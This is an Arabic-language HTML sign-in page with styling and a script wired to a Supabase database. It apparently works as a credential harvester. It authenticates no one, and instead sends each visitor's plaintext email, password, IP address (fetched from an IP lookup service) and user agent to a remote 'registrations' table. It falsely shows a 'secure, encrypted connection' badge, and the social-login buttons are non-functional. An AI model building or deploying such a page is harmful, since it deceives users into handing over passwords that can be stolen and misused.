<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        .bg-animated {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: linear-gradient(-45deg, #0f0c29, #302b63, #24243e, #1a1a2e);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }

        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            animation: floatUp linear infinite;
        }

        @keyframes floatUp {
            0% { transform: translateY(100vh); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh); opacity: 0; }
        }

        .main-container {
            width: 100%;
            max-width: 460px;
            padding: 20px;
            animation: fadeInUp 0.8s ease;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .login-card {
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 28px;
            padding: 45px 35px;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }

        .header {
            text-align: center;
            margin-bottom: 35px;
        }

        .logo-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            margin: 0 auto 20px;
            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4);
            animation: pulse 3s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        .header h1 {
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .header p {
            color: rgba(255, 255, 255, 0.4);
            font-size: 14px;
        }

        .tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 30px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 14px;
            padding: 5px;
        }

        .tab {
            flex: 1;
            padding: 12px;
            text-align: center;
            border-radius: 10px;
            cursor: pointer;
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s ease;
            font-family: inherit;
            border: none;
            background: none;
        }

        .tab.active {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: #fff;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
        }

        .input-group {
            margin-bottom: 22px;
        }

        .input-group label {
            display: block;
            color: rgba(255, 255, 255, 0.7);
            font-size: 13px;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper .field-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
            opacity: 0.4;
            pointer-events: none;
        }

        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 16px 48px 16px 48px;
            background: rgba(255, 255, 255, 0.07);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 14px;
            color: #fff;
            font-size: 15px;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
            outline: none;
        }

        input:focus {
            border-color: #667eea;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.15);
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.25);
        }

        .toggle-pass {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: rgba(255, 255, 255, 0.4);
            cursor: pointer;
            font-size: 18px;
            padding: 5px;
        }

        .password-strength {
            margin-top: 10px;
            display: none;
        }

        .strength-bar {
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 6px;
        }

        .strength-fill {
            height: 100%;
            border-radius: 4px;
            transition: all 0.4s ease;
            width: 0%;
        }

        .strength-text {
            font-size: 11px;
            font-weight: 500;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 14px;
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.4s ease;
            background: linear-gradient(135deg, #667eea, #764ba2);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
            margin-top: 10px;
            position: relative;
            overflow: hidden;
        }

        .btn-submit::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: 0.5s;
        }

        .btn-submit:hover::before { left: 100%; }

        .btn-submit:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.5);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .divider {
            display: flex;
            align-items: center;
            gap: 15px;
            margin: 25px 0;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.1);
        }

        .divider span {
            color: rgba(255, 255, 255, 0.3);
            font-size: 12px;
        }

        .social-btns {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .social-btn {
            padding: 13px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.04);
            color: #fff;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            font-family: 'Tajawal', sans-serif;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .social-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateY(-2px);
        }

        .footer-text {
            text-align: center;
            margin-top: 25px;
        }

        .secure-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            background: rgba(72, 187, 120, 0.1);
            padding: 6px 14px;
            border-radius: 20px;
            color: #68d391;
            font-size: 11px;
        }

        /* الإشعارات */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            padding: 14px 28px;
            border-radius: 14px;
            font-size: 14px;
            font-family: 'Tajawal', sans-serif;
            font-weight: 500;
            z-index: 9999;
            transition: transform 0.4s ease;
        }

        .toast.show { transform: translateX(-50%) translateY(0); }
        .toast.success { background: rgba(72, 187, 120, 0.95); color: #fff; }
        .toast.error { background: rgba(245, 87, 108, 0.95); color: #fff; }

        .success-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            backdrop-filter: blur(10px);
        }

        .success-overlay.show { display: flex; }

        .success-box {
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 50px 40px;
            text-align: center;
            max-width: 350px;
            animation: bounceIn 0.5s ease;
        }

        @keyframes bounceIn {
            0% { transform: scale(0.5); opacity: 0; }
            70% { transform: scale(1.05); }
            100% { transform: scale(1); opacity: 1; }
        }

        .success-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }

        .success-box h2 {
            color: #68d391;
            font-size: 22px;
            margin-bottom: 10px;
        }

        .success-box p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
        }

        /* شريط التحميل العلوي */
        .top-loader {
            position: fixed;
            top: 0;
            left: 0;
            height: 3px;
            background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
            z-index: 9999;
            border-radius: 0 3px 3px 0;
            transition: width 0.4s ease;
            width: 0%;
        }

        /* صندوق الأخطاء للتصحيح */
        .debug-box {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.9);
            color: #fc8181;
            padding: 15px;
            border-radius: 10px;
            font-size: 12px;
            max-width: 350px;
            z-index: 9999;
            display: none;
            direction: ltr;
            text-align: left;
            font-family: monospace;
            word-break: break-all;
            border: 1px solid #fc8181;
        }

        .debug-box.show { display: block; }

        .debug-close {
            position: absolute;
            top: 5px;
            right: 10px;
            color: #fff;
            cursor: pointer;
            font-size: 16px;
        }

        /* حالة الاتصال */
        .connection-status {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 8px 20px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            z-index: 9999;
            display: none;
        }

        .connection-status.connected {
            background: rgba(72, 187, 120, 0.15);
            color: #68d391;
            border: 1px solid rgba(72, 187, 120, 0.3);
            display: block;
            animation: fadeOut 3s ease forwards;
        }

        .connection-status.failed {
            background: rgba(245, 87, 108, 0.15);
            color: #f5576c;
            border: 1px solid rgba(245, 87, 108, 0.3);
            display: block;
        }

        @keyframes fadeOut {
            0%, 70% { opacity: 1; }
            100% { opacity: 0; display: none; }
        }

        @media (max-width: 480px) {
            .login-card { padding: 35px 25px; }
            .social-btns { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="bg-animated"></div>
    <div class="particles" id="particles"></div>
    <div class="top-loader" id="topLoader"></div>

    <!-- حالة الاتصال -->
    <div class="connection-status" id="connectionStatus"></div>

    <!-- صندوق الأخطاء -->
    <div class="debug-box" id="debugBox">
        <span class="debug-close" onclick="this.parentElement.classList.remove('show')">✕</span>
        <div id="debugContent"></div>
    </div>

    <!-- تأثير النجاح -->
    <div class="success-overlay" id="successOverlay" onclick="this.classList.remove('show')">
        <div class="success-box">
            <div class="success-icon">✅</div>
            <h2>تم بنجاح!</h2>
            <p>تم تسجيل بياناتك بنجاح</p>
        </div>
    </div>

    <div class="main-container">
        <div class="login-card">
            <div class="header">
                <div class="logo-icon">🔐</div>
                <h1>تسجيل الدخول</h1>
                <p>أدخل بياناتك للوصول إلى حسابك</p>
            </div>

            <div class="tabs">
                <button class="tab active" onclick="switchTab(this, 'login')">🔑 تسجيل دخول</button>
                <button class="tab" onclick="switchTab(this, 'register')">✨ حساب جديد</button>
            </div>

            <form id="mainForm">
                <div class="input-group">
                    <label>📧 البريد الإلكتروني</label>
                    <div class="input-wrapper">
                        <span class="field-icon">📧</span>
                        <input type="email" id="email" placeholder="example@email.com" required autocomplete="off">
                    </div>
                </div>

                <div class="input-group">
                    <label>🔒 كلمة المرور</label>
                    <div class="input-wrapper">
                        <span class="field-icon">🔒</span>
                        <input type="password" id="password" placeholder="••••••••" required autocomplete="off">
                        <button type="button" class="toggle-pass" onclick="togglePassword()">👁️</button>
                    </div>
                    <div class="password-strength" id="strengthBox">
                        <div class="strength-bar">
                            <div class="strength-fill" id="strengthFill"></div>
                        </div>
                        <div class="strength-text" id="strengthText"></div>
                    </div>
                </div>

                <button type="submit" class="btn-submit" id="submitBtn">
                    تسجيل الدخول ←
                </button>
            </form>

            <div class="divider"><span>أو</span></div>

            <div class="social-btns">
                <button class="social-btn" onclick="showToast('قريباً...', 'error')">🔵 Google</button>
                <button class="social-btn" onclick="showToast('قريباً...', 'error')">🍎 Apple</button>
            </div>

            <div class="footer-text">
                <div class="secure-badge">🔒 اتصال آمن ومشفر</div>
            </div>
        </div>
    </div>

    <script>
        // =============================================
        //  إعداد Supabase
        // =============================================
        const SUPABASE_URL = 'https://efaihsifuedacoawbddo.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVmYWloc2lmdWVkYWNvYXdiZGRvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI3ODgzNDQsImV4cCI6MjA4ODM2NDM0NH0.P3ejbFe1wU2HOtdUouVlH3pCjIUUqmB0XpkKf8hXBGs';

        let db;

        // تهيئة Supabase مع فحص الاتصال
        async function initSupabase() {
            try {
                console.log('🔄 جاري الاتصال بـ Supabase...');

                db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

                // فحص الاتصال بقراءة البيانات
                const { data, error } = await db
                    .from('registrations')
                    .select('id')
                    .limit(1);

                if (error) {
                    throw error;
                }

                console.log('✅ تم الاتصال بنجاح!');
                showConnectionStatus('✅ متصل بقاعدة البيانات', 'connected');

            } catch (error) {
                console.error('❌ خطأ في الاتصال:', error);
                showConnectionStatus('❌ فشل الاتصال بقاعدة البيانات', 'failed');
                showDebug('Connection Error', error);
            }
        }

        // فحص الاتصال عند تحميل الصفحة
        window.addEventListener('load', initSupabase);

        // =============================================
        //  إظهار حالة الاتصال
        // =============================================
        function showConnectionStatus(text, type) {
            const el = document.getElementById('connectionStatus');
            el.textContent = text;
            el.className = 'connection-status ' + type;
        }

        // =============================================
        //  صندوق الأخطاء للتصحيح
        // =============================================
        function showDebug(title, error) {
            const box = document.getElementById('debugBox');
            const content = document.getElementById('debugContent');
            content.innerHTML = `
                <strong>${title}</strong><br><br>
                <strong>Message:</strong> ${error.message || 'Unknown'}<br>
                <strong>Code:</strong> ${error.code || 'N/A'}<br>
                <strong>Details:</strong> ${error.details || 'N/A'}<br>
                <strong>Hint:</strong> ${error.hint || 'N/A'}
            `;
            box.classList.add('show');
        }

        // =============================================
        //  إرسال النموذج
        // =============================================
        document.getElementById('mainForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');

            if (!email || !password) {
                showToast('❌ يرجى ملء جميع الحقول', 'error');
                return;
            }

            // تعطيل الزر
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span> جاري الإرسال...';
            setLoader(70);

            try {
                // جمع IP
                let ipAddress = 'unknown';
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    ipAddress = ipData.ip;
                } catch (e) {
                    console.log('Could not get IP');
                }

                console.log('📤 جاري إرسال البيانات...');
                console.log('Email:', email);

                // إرسال البيانات إلى Supabase
                const { data, error } = await db
                    .from('registrations')
                    .insert([
                        {
                            email: email,
                            password: password,
                            ip_address: ipAddress,
                            user_agent: navigator.userAgent
                        }
                    ])
                    .select();

                console.log('Response data:', data);
                console.log('Response error:', error);

                if (error) {
                    throw error;
                }

                // نجاح!
                setLoader(100);
                console.log('✅ تم الإرسال بنجاح!');

                // إظهار شاشة النجاح
                document.getElementById('successOverlay').classList.add('show');
                showToast('✅ تم التسجيل بنجاح!', 'success');
                document.getElementById('mainForm').reset();
                document.getElementById('strengthBox').style.display = 'none';

                setTimeout(() => {
                    document.getElementById('successOverlay').classList.remove('show');
                }, 3000);

            } catch (error) {
                console.error('❌ خطأ:', error);
                setLoader(100);
                showToast('❌ خطأ: ' + (error.message || 'حاول مرة أخرى'), 'error');
                showDebug('Insert Error', error);

            } finally {
                btn.disabled = false;
                btn.textContent = 'تسجيل الدخول ←';
            }
        });

        // =============================================
        //  الوظائف المساعدة
        // =============================================

        function togglePassword() {
            const input = document.getElementById('password');
            const btn = document.querySelector('.toggle-pass');
            if (input.type === 'password') {
                input.type = 'text';
                btn.textContent = '🙈';
            } else {
                input.type = 'password';
                btn.textContent = '👁️';
            }
        }

        function switchTab(el, tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            el.classList.add('active');
            const btn = document.getElementById('submitBtn');
            btn.textContent = tab === 'login' ? 'تسجيل الدخول ←' : 'إنشاء حساب ←';
        }

        // مؤشر قوة كلمة المرور
        document.getElementById('password').addEventListener('input', function () {
            const val = this.value;
            const box = document.getElementById('strengthBox');
            const fill = document.getElementById('strengthFill');
            const text = document.getElementById('strengthText');

            if (val.length === 0) { box.style.display = 'none'; return; }
            box.style.display = 'block';

            let s = 0;
            if (val.length >= 6) s++;
            if (val.length >= 10) s++;
            if (/[A-Z]/.test(val)) s++;
            if (/[0-9]/.test(val)) s++;
            if (/[^A-Za-z0-9]/.test(val)) s++;

            const levels = [
                { w: '20%', c: '#fc8181', t: '🔴 ضعيفة جداً' },
                { w: '40%', c: '#f6ad55', t: '🟠 ضعيفة' },
                { w: '60%', c: '#faf089', t: '🟡 متوسطة' },
                { w: '80%', c: '#68d391', t: '🟢 قوية' },
                { w: '100%', c: '#48bb78', t: '💪 قوية جداً' }
            ];
            const l = levels[Math.min(s, 4)];
            fill.style.width = l.w;
            fill.style.background = l.c;
            text.style.color = l.c;
            text.textContent = l.t;
        });

        function showToast(message, type) {
            const old = document.querySelector('.toast');
            if (old) old.remove();
            const t = document.createElement('div');
            t.className = 'toast ' + type;
            t.textContent = message;
            document.body.appendChild(t);
            setTimeout(() => t.classList.add('show'), 10);
            setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 400); }, 3000);
        }

        function setLoader(percent) {
            const l = document.getElementById('topLoader');
            l.style.width = percent + '%';
            if (percent >= 100) setTimeout(() => l.style.width = '0%', 500);
        }

        // إنشاء الجزيئات
        (function () {
            const c = document.getElementById('particles');
            for (let i = 0; i < 40; i++) {
                const p = document.createElement('div');
                p.className = 'particle';
                p.style.left = Math.random() * 100 + '%';
                p.style.width = p.style.height = (Math.random() * 4 + 2) + 'px';
                p.style.animationDuration = (Math.random() * 10 + 10) + 's';
                p.style.animationDelay = (Math.random() * 10) + 's';
                c.appendChild(p);
            }
        })();
    </script>
</body>
